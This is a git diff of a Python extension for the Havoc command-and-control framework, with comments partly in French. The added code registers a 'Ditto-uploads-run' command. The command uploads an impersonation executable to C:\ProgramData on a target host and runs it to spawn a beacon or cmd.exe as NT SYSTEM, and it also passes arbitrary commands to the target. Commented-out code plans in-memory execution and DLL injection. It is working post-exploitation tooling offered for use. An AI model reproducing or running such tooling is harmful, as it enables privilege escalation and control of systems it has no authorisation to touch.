@@ -2,6 +2,8 @@ from havoc import Demon, RegisterCommand
 import os
 import argparse
 
+PATHTOFILE = "C:\\ProgramData\\"
+EXECUTABLEFILE = None
 
 def parse_args(params):
     parser = argparse.ArgumentParser(description='This tool implemant impersonnate in Havoc frameworks', exit_on_error=False)
@@ -11,58 +13,75 @@ def parse_args(params):
     parser_exec.add_argument('executable_path')
 
     parser_system = subparsers.add_parser('DemonAsSystem', help='Get shell as NT System')
+    parser_system.add_argument('beacon_path')
 
-    parser_passsthru = subparsers.add_parser('exec', help='Command to execute on target')
+    parser_passsthru = subparsers.add_parser('Exec', help='Command to execute on target')
+    parser_passsthru.add_argument('commandline', nargs='+')
+
+    ## parser_DLL = subparsers.add_parser('Inject', help='Dll inject in other process') // Incoming
 
     return parser.parse_args(args=params)
 
-##def impersonnatelaunchinmemory( demonID, *param ):
-##    TaskID : str    = None
-##    demon  : Demon  = None
-##    packer = Packer()
-##
-##    impersonnate_current_dir = os.getcwd()
-##    impersonnate_install_path = "/Documents/Outil/Havoc/data/extensions/Havoc-impersonnate/"
-##    agent_bin = impersonnate_current_dir + impersonnate_install_path + "Havoc-impersonnate/impersonnateRS.exe"
-##    demon.Command(TaskID, "upload %s" % (agent_bin))
 
-
-PATHTOFILE = "C:\\ProgramData\\"
-EXECUTABLEFILE = None
+###def impersonnatelaunchinmemory( demonID, *param ):   // Incoming
+###    global EXECUTABLEFILE
+###    
+###    demon  = Demon( demonID )
+###    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "Success")
+###    
+###    try:
+###        args = parse_args(param)
+###    except Exception as e:
+###        demon.ConsoleWrite(demon.CONSOLE_ERROR, str(e))
+###
+###    if args.command == 'SetExecutableFile':
+###        EXECUTABLEFILE = args.executable_path
+###        demon.ConsoleWrite(demon.CONSOLE_INFO, "Chemin Enregistrer")
+###        #demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_Ditto}')
+###    elif args.command == 'DemonAsSystem':
+###        if EXECUTABLEFILE is None:
+###            demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
+###        else:
+###            beaconpath = args.beacon_path
+###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
+###            #demon.Command(TaskID, f"noconsolation {EXECUTABLEFILE} --continue-on-error --target-username syst exec --command cmd.exe --detached")
+###            demon.Command(TaskID, f"rportfwd")
+###    else:
+###        arg = " ".join(args.commandline)
+###        demon.Command(TaskID, f"shell {dest_Ditto} {arg}")
+###    return TaskID
 
 
 def impersonnate( demonID, *param ):
     global EXECUTABLEFILE
     
     demon  = Demon( demonID )
-    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "test")
+    TaskID: str = demon.ConsoleWrite(demon.CONSOLE_TASK, "Success")
     
     try:
         args = parse_args(param)
     except Exception as e:
         demon.ConsoleWrite(demon.CONSOLE_ERROR, str(e))
     
-    dest_path = f"{PATHTOFILE}{demonID}.exe"
+    dest_Ditto = f"{PATHTOFILE}{demonID}.exe"
 
     if args.command == 'SetExecutableFile':
         EXECUTABLEFILE = args.executable_path
-        demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_path}')
+        demon.Command(TaskID, f'upload {EXECUTABLEFILE} {dest_Ditto}')
     elif args.command == 'DemonAsSystem':
         if EXECUTABLEFILE is None:
             demon.ConsoleWrite(demon.CONSOLE_ERROR, "Vous devez executée la commande avec l'argument SetExecutableFile + Chemin vers l'executable sur votre machine")
         else:
-            demon.Command(TaskID, f"shell {dest_path} --continue-on-error --target-username syst exec --command cmd.exe --detached")
+            beaconpath = args.beacon_path
+            demon.Command(TaskID, f"shell {dest_Ditto} --continue-on-error --target-username syst exec --command {beaconpath} --detached")
     else:
-        
+        arg = " ".join(args.commandline)
+        demon.Command(TaskID, f"noconsolation {dest_Ditto} {arg}")
+    
+    return TaskID
 
-    # impersonnate_current_dir = os.getcwd()
-    # impersonnate_install_path = "/Documents/Outil/Havoc/data/extensions/Havoc-impersonnate/"
-    # agent_bin = "/home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe"
-    # dest_path = f"{PATHTOFILE}{demonID}.exe"
-    # demon.Command(TaskID, f'upload {agent_bin} {dest_path}')
-    # demon.ConsoleWrite(demon.CONSOLE_INFO, "Upload Ditto in RoamingAPPDATA")
-    # ##demon.Command(TaskID, f"shell {dest_path}")
-    # demon.Command(TaskID, f"shell {dest_path} {parse_args(param)}")
-    # demon.ConsoleWrite(demon.CONSOLE_INFO, param[0])
+RegisterCommand(impersonnate, "", "Ditto-uploads-run", "Uploads and run Ditto tool on the target", 0, "", "" )
+# RegisterCommand(impersonnatelaunchinmemory, "", "Ditto-noconsolation", "run Ditto tool in memory of the target with no upload", 0, "", "" )
 
-RegisterCommand(impersonnate, "", "impersonnate-uploads-run", "Uploads and run impersonnate tool on the target", 0, "", "" )
+
+# Ditto-uploads-run SetExecutableFile /home/arthur/Documents/malware/havoc_module/Havoc_impersonnate/Ditto.exe
